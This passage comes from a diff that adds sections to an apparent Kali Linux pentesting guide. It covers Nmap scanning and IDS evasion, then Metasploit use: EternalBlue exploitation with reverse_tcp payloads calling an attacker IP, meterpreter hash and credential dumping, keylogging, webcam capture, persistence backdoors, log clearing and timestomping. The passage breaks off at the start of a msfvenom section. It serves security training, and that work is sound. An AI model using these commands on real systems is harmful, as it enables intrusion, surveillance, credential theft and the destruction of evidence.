+                • <strong>Passive:</strong> OSINT only (stealthy, won't alert target)<br>
+                • <strong>Active:</strong> DNS queries + port scanning (thorough but noisy)<br><br>
+                <strong>Pro tip:</strong> Always start with passive mode, then active if needed! 🔍</p>
+            </div>
+
+            <h4>Nmap (Network Mapper - THE Ultimate Port Scanner)</h4>
+
+            <p><strong>What is it?</strong> Nmap is THE standard network scanning tool. It discovers hosts, open ports, services, operating systems, and vulnerabilities. Every penetration tester uses Nmap daily! Massively powerful with 100+ options.</p>
+
+            <h5>Basic Scanning - Understanding the Fundamentals</h5>
+
+            <div class="code"># Simplest scan (TCP SYN scan on 1000 most common ports):
+nmap 192.168.1.1
+
+# FLAGS EXPLAINED FOR COMPLETE BEGINNERS:
+# No flags = default behavior:
+#   - TCP SYN scan (-sS) on 1000 common ports
+#   - Reverse DNS resolution
+#   - No OS/version detection
+
+# Output shows:
+# PORT     STATE SERVICE
+# 22/tcp   open  ssh
+# 80/tcp   open  http
+# 443/tcp  open  https
+
+# Scan multiple targets:
+nmap 192.168.1.1 192.168.1.2 192.168.1.3
+nmap 192.168.1.1-10                      # Range: .1 through .10
+nmap 192.168.1.0/24                      # Entire subnet (256 hosts)
+nmap 192.168.1.* 192.168.2.*             # Wildcard
+
+# Scan from file:
+nmap -iL targets.txt
+# -iL targets.txt  ← Input list (one IP/hostname per line)
+
+# Exclude targets:
+nmap 192.168.1.0/24 --exclude 192.168.1.1,192.168.1.254
+# --exclude  ← Skip these hosts (router, critical servers)</div>
+
+            <h5>Scan Types - How Nmap Probes Ports</h5>
+
+            <div class="code"># TCP SYN Scan (stealth scan, default with root):
+nmap -sS 192.168.1.1
+# -sS  ← SYN scan (half-open scan)
+# How it works:
+#   1. Send SYN packet
+#   2. If SYN/ACK received → port OPEN
+#   3. If RST received → port CLOSED
+#   4. If no response → port FILTERED
+# Doesn't complete TCP handshake = "stealth"
+# Requires root/admin privileges
+# Fast and efficient!
+
+# TCP Connect Scan (full 3-way handshake):
+nmap -sT 192.168.1.1
+# -sT  ← TCP connect scan
+# How it works:
+#   1. Complete full TCP 3-way handshake
+#   2. OS establishes full connection
+# Used when: No root privileges OR raw packet access unavailable
+# Slower than SYN scan
+# Shows in target's connection logs!
+
+# UDP Scan:
+nmap -sU 192.168.1.1
+# -sU  ← UDP scan
+# Finds: DNS (53), SNMP (161), DHCP (67/68), NTP (123)
+# SLOW! (timeouts for closed ports)
+# Combine with TCP: nmap -sS -sU 192.168.1.1
+
+# NULL/FIN/Xmas Scans (evade simple firewalls):
+nmap -sN 192.168.1.1  # NULL scan (no flags set)
+nmap -sF 192.168.1.1  # FIN scan (FIN flag set)
+nmap -sX 192.168.1.1  # Xmas scan (FIN, PSH, URG flags set)
+# How they work:
+#   - Send packet with unusual flags
+#   - Closed port responds with RST
+#   - Open port does NOT respond (stealthy!)
+# Evades: Stateless firewalls
+# Doesn't work: Windows (responds to all packets)
+
+# ACK Scan (firewall rule mapping):
+nmap -sA 192.168.1.1
+# -sA  ← ACK scan
+# Purpose: Map firewall rules (not find open ports!)
+# Response:
+#   - RST = port UNFILTERED (firewall allows)
+#   - No response = port FILTERED (firewall blocks)
+# Useful for: Understanding firewall behavior
+
+# Window Scan (distinguish open from closed):
+nmap -sW 192.168.1.1
+# -sW  ← Window scan
+# Examines TCP window size in RST packet
+# Some systems: Different window for open vs closed
+
+# SCTP INIT Scan (for SCTP services):
+nmap -sY 192.168.1.1
+# -sY  ← SCTP INIT scan
+# For: Stream Control Transmission Protocol (VoIP, SS7)</div>
+
+            <h5>Port Specification - Choose What to Scan</h5>
+
+            <div class="code"># Scan specific ports:
+nmap -p 22 192.168.1.1                    # Single port (SSH)
+nmap -p 22,80,443 192.168.1.1             # Multiple ports
+nmap -p 1-1000 192.168.1.1                # Port range
+nmap -p- 192.168.1.1                      # ALL 65535 ports (SLOW!)
+
+# FLAGS EXPLAINED:
+# -p <port>  ← Port specification
+# Default: Scans 1000 most common ports
+# -p- = scan ALL ports (1-65535)
+
+# Scan by protocol:
+nmap -p U:53,T:21-25,80 192.168.1.1
+# U:53     ← UDP port 53 (DNS)
+# T:21-25  ← TCP ports 21-25 (FTP, SSH, Telnet, SMTP)
+# T:80     ← TCP port 80 (HTTP)
+
+# Fast scan (100 most common ports):
+nmap -F 192.168.1.1
+# -F  ← Fast mode
+# Scans only 100 ports (vs default 1000)
+# Much faster!
+
+# Top ports:
+nmap --top-ports 20 192.168.1.1
+# --top-ports 20  ← Scan 20 most common ports
+# Useful for: Quick reconnaissance
+
+# Scan ports by name:
+nmap -p http,https,ssh 192.168.1.1
+# Scans ports: 80, 443, 22
+
+# Consecutive ports:
+nmap -p 1-100,443,8000-9000 192.168.1.1
+# Scans: 1-100, 443, 8000-9000
+
+# Exclude ports:
+nmap -p 1-1000 --exclude-ports 135,139,445 192.168.1.1
+# --exclude-ports  ← Skip these ports</div>
+
+            <h5>Service/Version Detection - Identify Running Services</h5>
+
+            <div class="code"># Version detection:
+nmap -sV 192.168.1.1
+# -sV  ← Service/version detection
+# Probes open ports to determine:
+#   - Service name (SSH, HTTP, MySQL)
+#   - Version (OpenSSH 8.2p1, Apache 2.4.41)
+#   - Extra info (OS, device type)
+
+# Example output:
+# PORT   STATE SERVICE VERSION
+# 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+# 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+# Version intensity:
+nmap -sV --version-intensity 0 192.168.1.1  # Light probing (fast, less accurate)
+nmap -sV --version-intensity 5 192.168.1.1  # Normal (default)
+nmap -sV --version-intensity 9 192.168.1.1  # Aggressive (slow, most accurate)
+# --version-intensity <0-9>
+#   0 = Light (try 2 probes)
+#   5 = Default
+#   9 = Try ALL probes (slow but thorough!)
+
+# Light version scan:
+nmap -sV --version-light 192.168.1.1
+# Equivalent to --version-intensity 2
+
+# Aggressive version scan:
+nmap -sV --version-all 192.168.1.1
+# Equivalent to --version-intensity 9
+# Tries EVERY single probe (very slow!)
+
+# RPC services:
+nmap -sV --version-trace 192.168.1.1
+# --version-trace  ← Show detailed version detection process
+# For debugging when version detection fails</div>
+
+            <h5>OS Detection - Identify Operating System</h5>
+
+            <div class="code"># OS detection:
+nmap -O 192.168.1.1
+# -O  ← Enable OS detection
+# Analyzes: TCP/IP stack fingerprints
+# Example output:
+# OS details: Linux 5.4 - 5.10
+# Network Distance: 2 hops
+
+# Aggressive OS detection:
+nmap -O --osscan-guess 192.168.1.1
+# --osscan-guess  ← Make best guess when uncertain
+# Shows confidence percentage
+
+# OS detection only (skip port scan):
+nmap -O --osscan-limit 192.168.1.1
+# --osscan-limit  ← Only scan hosts with open+closed ports
+# Skips: Hosts with all filtered ports (faster)
+
+# Maximum OS detection retries:
+nmap -O --max-os-tries 1 192.168.1.1
+# --max-os-tries 1  ← Try OS detection once (faster)
+# Default: 5 tries</div>
+
+            <h5>Timing and Performance - Control Scan Speed</h5>
+
+            <div class="code"># Timing templates (simplest way to control speed):
+nmap -T0 192.168.1.1  # Paranoid (slowest, evade IDS)
+nmap -T1 192.168.1.1  # Sneaky
+nmap -T2 192.168.1.1  # Polite (less bandwidth)
+nmap -T3 192.168.1.1  # Normal (default)
+nmap -T4 192.168.1.1  # Aggressive (fast, assume reliable network)
+nmap -T5 192.168.1.1  # Insane (fastest, may sacrifice accuracy)
+
+# BEGINNER EXPLANATION:
+# -T<0-5>  ← Timing template
+# T0-T1: VERY slow (IDS evasion, takes hours!)
+# T2: Polite (slow, 0.4s between probes)
+# T3: Default (good for most scans)
+# T4: Fast (assumes reliable network, 0.9ms between probes)
+# T5: Insane (may miss ports, only on fast networks!)
+
+# For CTFs/labs: Use -T4
+# For real engagements: Use -T2 or -T3 (stealthier)
+
+# Fine-grained timing control:
+
+# Parallelism (simultaneous probes):
+nmap --min-parallelism 10 --max-parallelism 100 192.168.1.1
+# --min-parallelism 10  ← Minimum 10 parallel probes
+# --max-parallelism 100  ← Maximum 100 parallel probes
+# Higher = faster but noisier
+
+# RTT timeout (round-trip time):
+nmap --min-rtt-timeout 100ms --max-rtt-timeout 300ms 192.168.1.1
+# --min-rtt-timeout  ← Minimum time to wait for response
+# --max-rtt-timeout  ← Maximum time to wait
+# Lower = faster but may miss slow hosts
+
+# Host timeout:
+nmap --host-timeout 5m 192.168.1.1
+# --host-timeout 5m  ← Give up on host after 5 minutes
+# Prevents: One slow host holding up entire scan
+
+# Scan delay:
+nmap --scan-delay 1s 192.168.1.1
+# --scan-delay 1s  ← Wait 1 second between probes
+# Use for: IDS evasion, slow networks
+
+# Maximum retries:
+nmap --max-retries 1 192.168.1.1
+# --max-retries 1  ← Retry closed/filtered ports once
+# Default: 10 retries
+# Lower = faster but less accurate</div>
+
+            <h5>NSE Scripts - Nmap Scripting Engine (POWERFUL!)</h5>
+
+            <div class="code"># List all scripts:
+ls /usr/share/nmap/scripts/
+# 600+ NSE scripts for everything!
+
+# View script help:
+nmap --script-help http-enum
+# Shows: What script does, categories, example usage
+
+# Script categories:
+# auth     = Authentication testing
+# brute    = Brute force attacks
+# default  = Safe scripts (run with -sC)
+# discovery = Network discovery
+# dos      = Denial of service
+# exploit  = Exploit vulnerabilities
+# external = Query external services
+# fuzzer   = Send unexpected input
+# intrusive = May crash target
+# malware  = Malware detection
+# safe     = Won't harm target
+# version  = Version detection enhancement
+# vuln     = Vulnerability detection
+
+# Run default scripts:
+nmap -sC 192.168.1.1
+# -sC  ← Run default NSE scripts
+# Same as: --script=default
+
+# Run specific script:
+nmap --script http-enum 192.168.1.1
+# --script http-enum  ← Web directory enumeration
+
+# Run multiple scripts:
+nmap --script http-enum,http-headers,http-methods 192.168.1.1
+
+# Run all scripts in category:
+nmap --script vuln 192.168.1.1
+# Runs ALL vulnerability detection scripts!
+
+# Wildcard:
+nmap --script "http-*" 192.168.1.1
+# Runs all scripts starting with "http-"
+
+# Boolean logic:
+nmap --script "http-* and not http-brute" 192.168.1.1
+# Runs all HTTP scripts EXCEPT http-brute
+
+# Script arguments:
+nmap --script http-enum --script-args http-enum.basepath=/admin/ 192.168.1.1
+# --script-args  ← Pass arguments to scripts
+
+# Update script database:
+sudo nmap --script-updatedb
+# Downloads latest NSE scripts</div>
+
+            <h5>Essential NSE Scripts Every Pentester Uses</h5>
+
+            <div class="code"># === VULNERABILITY SCANNING ===
+
+# Scan for common vulnerabilities:
+nmap --script vuln 192.168.1.1
+# Checks for: CVEs, misconfigurations, known vulns
+
+# SMB vulnerabilities (EternalBlue, MS08-067):
+nmap --script smb-vuln-* 192.168.1.1
+# Detects: MS17-010 (EternalBlue), MS08-067, MS06-025
+
+# SSL/TLS vulnerabilities (Heartbleed, POODLE):
+nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection 192.168.1.1
+
+# === WEB APPLICATION TESTING ===
+
+# Enumerate web directories:
+nmap --script http-enum 192.168.1.1
+# Finds: /admin, /backup, /test, /phpmyadmin
+
+# HTTP methods allowed:
+nmap --script http-methods 192.168.1.1
+# Shows: GET, POST, PUT, DELETE (PUT/DELETE = potential vuln!)
+
+# HTTP headers:
+nmap --script http-headers 192.168.1.1
+# Shows: Server, X-Powered-By, cookies
+
+# Detect WAF:
+nmap --script http-waf-detect 192.168.1.1
+
+# WordPress/Joomla enumeration:
+nmap --script http-wordpress-enum 192.168.1.1
+
+# === DATABASE TESTING ===
+
+# MySQL info:
+nmap --script mysql-info 192.168.1.1
+
+# MySQL empty password:
+nmap --script mysql-empty-password 192.168.1.1
+
+# MS-SQL info:
+nmap --script ms-sql-info 192.168.1.1
+
+# MongoDB info:
+nmap --script mongodb-info 192.168.1.1
+
+# === SMB ENUMERATION ===
+
+# SMB version:
+nmap --script smb-os-discovery 192.168.1.1
+# Shows: OS, domain, hostname
+
+# SMB shares:
+nmap --script smb-enum-shares 192.168.1.1
+
+# SMB users:
+nmap --script smb-enum-users 192.168.1.1
+
+# SMB sessions:
+nmap --script smb-enum-sessions 192.168.1.1
+
+# === DNS ENUMERATION ===
+
+# DNS brute force:
+nmap --script dns-brute example.com
+
+# DNS zone transfer:
+nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 192.168.1.1
+
+# === BRUTE FORCING ===
+
+# SSH brute force:
+nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.1
+
+# FTP brute force:
+nmap --script ftp-brute 192.168.1.1
+
+# HTTP brute force:
+nmap --script http-brute --script-args http-brute.path=/admin/ 192.168.1.1
+
+# === MISCELLANEOUS ===
+
+# Check for default credentials:
+nmap --script auth 192.168.1.1
+
+# Banner grabbing (detailed):
+nmap --script banner 192.168.1.1
+
+# Traceroute with geolocation:
+nmap --script traceroute-geolocation 192.168.1.1
+
+# Broadcast discovery:
+nmap --script broadcast-dhcp-discover
+
+# Malware detection:
+nmap --script malware 192.168.1.1</div>
+
+            <h5>Firewall/IDS Evasion - Bypass Detection</h5>
+
+            <div class="code"># Fragment packets:
+nmap -f 192.168.1.1
+# -f  ← Fragment IP packets
+# Splits packets into tiny 8-byte fragments
+# May bypass: Simple packet filters
+
+# Custom MTU:
+nmap --mtu 16 192.168.1.1
+# --mtu 16  ← Set Maximum Transmission Unit
+# Must be multiple of 8
+# Smaller MTU = more fragments
+
+# Decoy scanning:
+nmap -D RND:10 192.168.1.1
+# -D RND:10  ← Use 10 random decoy IPs
+# Target sees: Scans from YOUR IP + 10 fake IPs
+# Hides your IP in noise!
+
+# Specific decoys:
+nmap -D 192.168.1.100,192.168.1.200,ME 192.168.1.1
+# ME = your real IP position in decoy list
+
+# Idle/Zombie scan (ULTIMATE stealth):
+nmap -sI zombie_host 192.168.1.1
+# -sI zombie_host  ← Use zombie host to scan
+# Zombie = host with predictable IP ID sequence
+# Target never sees YOUR IP!
+# Advanced technique, read: nmap.org/book/idlescan.html
+
+# Spoof source IP:
+nmap -S 192.168.1.254 192.168.1.1
+# -S 192.168.1.254  ← Spoof source IP
+# Target thinks scan came from .254
+# WARNING: You won't receive responses!
+
+# Spoof MAC address:
+nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1
+# --spoof-mac  ← Change source MAC
+# Use 0 for random MAC
+
+# Randomize target order:
+nmap --randomize-hosts 192.168.1.0/24
+# --randomize-hosts  ← Scan hosts in random order
+# Harder to detect patterns
+
+# Use proxies:
+nmap --proxies socks4://proxy1:1080,http://proxy2:8080 192.168.1.1
+# --proxies  ← Chain through proxy servers
+
+# Bad checksum (test firewall):
+nmap --badsum 192.168.1.1
+# --badsum  ← Send packets with invalid checksum
+# Firewalls may forward without checking
+# Real OS will drop packets
+
+# Append random data:
+nmap --data-length 50 192.168.1.1
+# --data-length 50  ← Add 50 random bytes to packets
+# Evade: Signature-based IDS</div>
+
+            <h5>Output Options - Save Your Results</h5>
+
+            <div class="code"># Normal output (to terminal + file):
+nmap 192.168.1.1 -oN scan_results.txt
+# -oN  ← Normal output (human-readable)
+
+# XML output (for parsing):
+nmap 192.168.1.1 -oX scan_results.xml
+# -oX  ← XML output
+# Parse with: Python, Ruby, Go
+# Import into: Metasploit, other tools
+
+# Grepable output:
+nmap 192.168.1.1 -oG scan_results.gnmap
+# -oG  ← Grepable format
+# Easy to grep: grep "open" scan_results.gnmap
+
+# All formats:
+nmap 192.168.1.1 -oA scan_results
+# -oA  ← Output ALL formats
+# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap
+
+# Script kiddie output:
+nmap 192.168.1.1 -oS scan_results_l33t.txt
+# -oS  ← Script kiddie format (leet speak!)
+# Just for fun 😄
+
+# Append to file:
+nmap 192.168.1.1 -oN scan_results.txt --append-output
+# --append-output  ← Don't overwrite, append
+
+# Verbose output:
+nmap -v 192.168.1.1
+# -v  ← Verbose (show progress)
+# -vv = Very verbose
+# -vvv = Even more verbose!
+
+# Debugging:
+nmap -d 192.168.1.1
+# -d  ← Debug mode
+# -dd = More debug info
+# Use when: Scan behaves unexpectedly
+
+# Show only open ports:
+nmap --open 192.168.1.1
+# --open  ← Only show open ports
+# Hides: Closed and filtered ports
+
+# Show reason port is open/closed:
+nmap --reason 192.168.1.1
+# --reason  ← Why Nmap marked port as open/closed
+# Example: "syn-ack" (SYN/ACK response received)</div>
+
+            <h5>Advanced Host Discovery - Find Live Hosts</h5>
+
+            <div class="code"># Default host discovery (before port scan):
+# Nmap sends:
+#   - ICMP echo request (ping)
+#   - TCP SYN to port 443
+#   - TCP ACK to port 80
+#   - ICMP timestamp request
+
+# Skip host discovery (assume host is up):
+nmap -Pn 192.168.1.1
+# -Pn  ← No ping (treat host as up)
+# Use when: Firewall blocks ICMP
+# Slower (scans even dead hosts)
+
+# ICMP ping:
+nmap -PE 192.168.1.1
+# -PE  ← ICMP echo request (standard ping)
+
+# ICMP timestamp:
+nmap -PP 192.168.1.1
+# -PP  ← ICMP timestamp request
+# Alternative when echo blocked
+
+# ICMP netmask:
+nmap -PM 192.168.1.1
+# -PM  ← ICMP netmask request
+
+# TCP SYN discovery:
+nmap -PS22,80,443 192.168.1.1
+# -PS  ← TCP SYN ping to ports 22,80,443
+# Effective against firewalls!
+
+# TCP ACK discovery:
+nmap -PA22,80,443 192.168.1.1
+# -PA  ← TCP ACK ping
+# Bypasses: Stateless firewalls
+
+# UDP discovery:
+nmap -PU53,161 192.168.1.1
+# -PU  ← UDP ping to ports 53,161
+# Useful for: Discovering firewalls/routers
+
+# ARP discovery (local network only):
+nmap -PR 192.168.1.0/24
+# -PR  ← ARP ping
+# Fastest on local network
+# Can't be blocked (layer 2!)
+
+# Disable DNS resolution:
+nmap -n 192.168.1.1
+# -n  ← Never do DNS resolution
+# Faster!
+
+# Force DNS resolution (for all hosts):
+nmap -R 192.168.1.1
+# -R  ← Always do DNS resolution
+
+# Custom DNS servers:
+nmap --dns-servers 8.8.8.8,1.1.1.1 192.168.1.1
+# --dns-servers  ← Use custom DNS</div>
+
+            <h5>Real-World Nmap Command Examples</h5>
+
+            <div class="code"># === PENTESTING WORKFLOW ===
+
+# 1. Quick network discovery:
+nmap -sn 192.168.1.0/24
+# -sn  ← Ping scan only (no port scan)
+# Finds: All live hosts on network
+
+# 2. Fast port scan of live hosts:
+nmap -T4 -F 192.168.1.1-254
+# -T4 = Fast
+# -F = Top 100 ports
+
+# 3. Comprehensive scan of interesting hosts:
+nmap -sS -sV -O -A -p- -T4 -oA full_scan 192.168.1.10
+# -sS = SYN scan
+# -sV = Version detection
+# -O = OS detection
+# -A = Aggressive (OS, version, scripts, traceroute)
+# -p- = All 65535 ports
+# -oA = All output formats
+
+# === SPECIFIC SCENARIOS ===
+
+# Web server deep scan:
+nmap -p 80,443 -sV --script "http-*" 192.168.1.10
+
+# SMB enumeration (Active Directory):
+nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.1.10
+
+# Vulnerability scan:
+nmap --script vuln -oA vuln_scan 192.168.1.10
+
+# Stealth scan (IDS evasion):
+nmap -sS -T2 -f -D RND:10 --randomize-hosts 192.168.1.0/24
+
+# UDP + TCP combined:
+nmap -sSU -p T:1-1000,U:53,161,500 192.168.1.1
+
+# === CTF/HTB QUICK COMMANDS ===
+
+# Initial recon:
+nmap -sC -sV -oA initial 10.10.10.10
+
+# Full port scan:
+nmap -p- -T4 --min-rate 1000 10.10.10.10
+
+# Detailed scan of found ports:
+nmap -p 22,80,443,8080 -sC -sV -A 10.10.10.10
+
+# === BUG BOUNTY ===
+
+# Subdomain discovery + port scan:
+nmap -iL subdomains.txt -p 80,443,8080,8443 --open -oA web_services
+
+# Check for common vulns:
+nmap --script http-vuln-* -p 80,443 target.com</div>
+
+            <div class="metaphor-box">
+                <h4>💡 Nmap Mastery Summary</h4>
+                <p><strong>Essential Nmap skills every hacker needs:</strong><br><br>
+                <strong>1. Basic reconnaissance:</strong><br>
+                • <code>nmap -sn 192.168.1.0/24</code> → Find live hosts<br>
+                • <code>nmap -sS -p- target.com</code> → Scan all ports<br>
+                • <code>nmap -sV -O target.com</code> → Identify services and OS<br><br>
+                <strong>2. Advanced enumeration:</strong><br>
+                • <code>nmap -sC -sV -oA scan target</code> → Full enumeration<br>
+                • <code>nmap --script vuln target</code> → Find vulnerabilities<br>
+                • <code>nmap -A target</code> → Everything (aggressive)<br><br>
+                <strong>3. Evasion techniques:</strong><br>
+                • <code>-T2</code> → Slow and stealthy<br>
+                • <code>-f</code> → Fragment packets<br>
+                • <code>-D RND:10</code> → Decoy scan (hide in noise)<br>
+                • <code>--spoof-mac 0</code> → Random MAC address<br><br>
+                <strong>4. NSE Scripts power:</strong><br>
+                • <code>--script vuln</code> → Vulnerability detection<br>
+                • <code>--script http-enum</code> → Web directory discovery<br>
+                • <code>--script smb-vuln-*</code> → SMB vulnerabilities (EternalBlue!)<br>
+                • <code>--script ssh-brute</code> → SSH password guessing<br><br>
+                <strong>5. Performance tuning:</strong><br>
+                • <code>-T4</code> → Fast (CTF/lab environments)<br>
+                • <code>--min-rate 1000</code> → Maintain 1000 packets/sec<br>
+                • <code>-F</code> → Fast scan (top 100 ports)<br>
+                • <code>-p-</code> → All 65535 ports (thorough)<br><br>
+                <strong>Pro tips:</strong><br>
+                • Always save output with <code>-oA</code> (all formats)<br>
+                • Use <code>-Pn</code> if ICMP is blocked<br>
+                • Combine TCP and UDP: <code>-sSU</code><br>
+                • Read the book: <strong>nmap.org/book/</strong> (free online!)<br>
+                • Learn NSE scripting: Write your own scripts in Lua!<br><br>
+                Nmap is THE most important tool in penetration testing. Master it = unlock the entire network! 🌐🔍</p>
+            </div>
+
             <p class="section-intro">Kali Linux ships with 600+ tools across every hacking domain. This alphabetical dictionary covers 100+ essential tools with descriptions, syntax, flags, and quick examples. Use this as your quick reference guide during CTFs, pentests, and learning. Tools are organized alphabetically with cross-references to deep-dive sections elsewhere in this guide. Each entry includes: category, installation, basic usage, key flags, and practical example. Let's build your ultimate hacking tool vocabulary! 🛠️</p>
 
             <div class=\"metaphor-box\">
@@ -17825,8 +19201,703 @@ sudo yersinia -I
                 • Keep notes in CherryTree or Obsidian for quick reference<br><br>
                 You now have the most comprehensive Kali tools dictionary. Reference this during CTFs, exams, and real-world pentests! 🛠️🔥</p>
             </div>
+
+            <h3>M-Tools: Metasploit, Mimikatz, and More</h3>
+
+            <h4>Metasploit Framework (THE Ultimate Exploitation Framework)</h4>
+
+            <p><strong>What is it?</strong> Metasploit is the KING of exploitation frameworks. Contains 2000+ exploits, 500+ payloads, post-exploitation modules, and a complete penetration testing workflow. Used by professionals worldwide!</p>
+
+            <h5>MSFconsole - The Main Interface</h5>
+
+            <div class="code"># Start Metasploit:
+msfconsole
+# Loads: Framework, exploits, payloads, auxiliary modules
+
+# BEGINNER EXPLANATION:
+# Metasploit has 5 module types:
+# 1. EXPLOITS   → Take advantage of vulnerabilities
+# 2. PAYLOADS   → Code that runs after exploitation (reverse shell, meterpreter)
+# 3. AUXILIARY  → Scanners, fuzzers, DoS tools
+# 4. POST       → Post-exploitation (after you have shell)
+# 5. ENCODERS   → Obfuscate payloads (evade antivirus)
+
+# Update Metasploit:
+msfupdate
+# Downloads latest exploits and modules
+
+# Search for exploits:
+msf6 > search eternalblue
+# Finds: exploit/windows/smb/ms17_010_eternalblue
+
+# Search with filters:
+search type:exploit platform:windows smb
+search cve:2021 rank:excellent
+search type:auxiliary name:smb
+
+# SEARCH FLAGS EXPLAINED:
+# type:exploit     → Only show exploits
+# type:auxiliary   → Only show scanners/tools
+# platform:windows → Only Windows exploits
+# platform:linux   → Only Linux exploits
+# rank:excellent   → Only excellent rank (reliable)
+# cve:2021         → Exploits for CVE-2021-XXXX
+
+# View exploit details:
+msf6 > info exploit/windows/smb/ms17_010_eternalblue
+# Shows: Description, targets, options, references
+
+# Use an exploit:
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+# Loads exploit module
+
+# Show required options:
+msf6 exploit(ms17_010_eternalblue) > show options
+# Shows: RHOSTS, RPORT, LHOST, etc.
+
+# Set target:
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
+# RHOSTS = Remote host (target IP)
+
+# Set local IP (for reverse shell):
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
+# LHOST = Local host (attacker IP)
+# Payload connects back to THIS IP!
+
+# Set payload:
+msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+# Payload = code that executes after exploit succeeds
+# reverse_tcp = connects back to attacker
+
+# Run the exploit:
+msf6 exploit(ms17_010_eternalblue) > exploit
+# Or: run, or: exploit -j (background job)
+
+# Background session:
+Ctrl+Z
+# Puts meterpreter session in background
+
+# List sessions:
+msf6 > sessions -l
+# Shows all active shells/meterpreter sessions
+
+# Interact with session:
+msf6 > sessions -i 1
+# -i 1  ← Interact with session ID 1
+
+# Kill session:
+msf6 > sessions -k 1
+# -k 1  ← Kill session ID 1
+
+# Kill all sessions:
+msf6 > sessions -K</div>
+
+            <h5>Meterpreter - Advanced Post-Exploitation</h5>
+
+            <div class="code"># After exploitation, you get meterpreter shell:
+meterpreter >
+
+# WHAT IS METERPRETER?
+# Advanced payload that runs in memory (no files on disk!)
+# Features:
+# - File upload/download
+# - Screenshot capture
+# - Keylogging
+# - Privilege escalation
+# - Pivoting/routing
+# - Persistence
+# - Process migration
+
+# === SYSTEM INFORMATION ===
+
+# System info:
+meterpreter > sysinfo
+# Shows: OS, architecture, computer name, domain
+
+# Current user:
+meterpreter > getuid
+# Shows: NT AUTHORITY\\SYSTEM or domain\\username
+
+# Network info:
+meterpreter > ipconfig
+# Shows: IP addresses, MAC, subnets
+
+# Check privileges:
+meterpreter > getprivs
+# Shows: SeDebugPrivilege, SeImpersonatePrivilege, etc.
+
+# === FILE SYSTEM ===
+
+# Current directory:
+meterpreter > pwd
+
+# Change directory:
+meterpreter > cd C:\\Users\\Administrator\\Desktop
+
+# List files:
+meterpreter > ls
+# Shows files in current directory
+
+# Search for files:
+meterpreter > search -f passwords.txt
+# -f passwords.txt  ← Search for filename
+
+# Search in specific directory:
+meterpreter > search -d C:\\Users -f *.txt
+# -d C:\\Users  ← Search directory
+# -f *.txt  ← Search pattern
+
+# Download file:
+meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/
+# Downloads to /tmp/ on attacker machine
+
+# Upload file:
+meterpreter > upload /tmp/mimikatz.exe C:\\Windows\\Temp\\
+# Uploads to target
+
+# === PROCESSES ===
+
+# List processes:
+meterpreter > ps
+# Shows: PID, name, user, architecture
+
+# Migrate to another process:
+meterpreter > migrate 1337
+# Moves meterpreter to PID 1337
+# WHY? Stability, evade detection, get new privileges
+
+# Kill process:
+meterpreter > kill 1337
+
+# Execute program:
+meterpreter > execute -f cmd.exe -i
+# -f cmd.exe  ← File to execute
+# -i  ← Interact (get shell)
+
+# === PRIVILEGE ESCALATION ===
+
+# Attempt automatic privesc:
+meterpreter > getsystem
+# Tries multiple techniques:
+# - Named pipe impersonation
+# - Token duplication
+# If successful: NT AUTHORITY\\SYSTEM!
+
+# Check if successful:
+meterpreter > getuid
+# Should show: NT AUTHORITY\\SYSTEM
+
+# === CREDENTIAL DUMPING ===
+
+# Dump password hashes (requires SYSTEM):
+meterpreter > hashdump
+# Dumps: SAM hashes (NTLM)
+# Output: username:RID:LM:NTLM:::
+
+# Load mimikatz (Kiwi):
+meterpreter > load kiwi
+# Loads mimikatz as meterpreter module!
+
+# Dump credentials from memory:
+meterpreter > creds_all
+# Dumps: Plaintext passwords, hashes, tickets
+
+# Kerberos tickets:
+meterpreter > kerberos
+
+# === SCREENSHOT & KEYLOGGING ===
+
+# Take screenshot:
+meterpreter > screenshot
+# Saves to /tmp/ on attacker machine
+
+# Start keylogger:
+meterpreter > keyscan_start
+# Captures all keystrokes
+
+# Dump captured keystrokes:
+meterpreter > keyscan_dump
+
+# Stop keylogger:
+meterpreter > keyscan_stop
+
+# === WEBCAM ===
+
+# List webcams:
+meterpreter > webcam_list
+
+# Take photo:
+meterpreter > webcam_snap
+# Captures image from webcam
+
+# Start video stream:
+meterpreter > webcam_stream
+
+# === NETWORK & PIVOTING ===
+
+# Port forwarding:
+meterpreter > portfwd add -l 4444 -p 445 -r 192.168.2.10
+# -l 4444  ← Local port on attacker machine
+# -p 445   ← Remote port on target
+# -r 192.168.2.10  ← Remote host (internal network)
+# Access: localhost:4444 → 192.168.2.10:445
+
+# Route through compromised host:
+meterpreter > run autoroute -s 192.168.2.0/24
+# -s 192.168.2.0/24  ← Subnet to route
+# Now can attack 192.168.2.0/24 through this host!
+
+# Scan internal network:
+meterpreter > run arp_scanner -r 192.168.2.0/24
+
+# === PERSISTENCE ===
+
+# Install backdoor:
+meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50
+# -X  ← Start on boot
+# -i 10  ← Connect every 10 seconds
+# -p 4444  ← Port
+# -r 192.168.1.50  ← Attacker IP
+
+# === MISCELLANEOUS ===
+
+# Shell access (cmd/bash):
+meterpreter > shell
+# Drops to system shell
+# Exit shell: exit (returns to meterpreter)
+
+# Clear event logs:
+meterpreter > clearev
+# Clears: Application, System, Security logs
+# Removes evidence!
+
+# Timestomp (modify file timestamps):
+meterpreter > timestomp C:\\backdoor.exe -z "2020-01-01 00:00:00"
+# Makes file look old (anti-forensics)
+
+# Background session:
+meterpreter > background
+# Or: Ctrl+Z
+
+# Exit meterpreter:
+meterpreter > exit</div>
+
+            <h5>Msfvenom - Payload Generator</h5>
+
+            <div class="code"># Msfvenom generates custom payloads for any platform!
+
+# === LIST AVAILABLE PAYLOADS ===
+
+# List all payloads:
+msfvenom -l payloads
+# Shows 500+ payloads
+
+# List by platform:
+msfvenom -l payloads | grep windows
+msfvenom -l payloads | grep linux
+msfvenom -l payloads | grep android
+
